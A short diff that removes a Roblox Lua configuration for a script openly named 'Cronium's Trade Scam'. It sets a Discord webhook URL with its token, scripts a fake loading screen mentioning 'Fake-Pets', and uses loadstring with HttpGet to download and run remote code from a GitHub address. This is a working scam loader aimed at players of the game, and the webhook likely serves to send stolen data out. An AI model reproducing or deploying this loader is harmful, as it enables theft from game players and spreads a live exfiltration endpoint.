@@ -1,9 +1,0 @@
-Username = "IAmTheRealEDP_445"
-WebHook = "https://discord.com/api/webhooks/1094822928643788831/Dbf5HexFPl-j3xtmzcnPB1JK0TWiSTXyvz0aM-CFqDMWg2owc4W_XfZMh6nKK5U7iRky"
-loadingscreen = true
-_G.CustomScriptName = "Cronium's Trade Scam"
-_G.Text1 = "Fetching Game Data..."
-_G.Text2 = "Loading GUIs..."
-_G.Text3 = "Loading "Fake-Pets.lua"..."
-_G.Text4 = "Preparing for launch..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
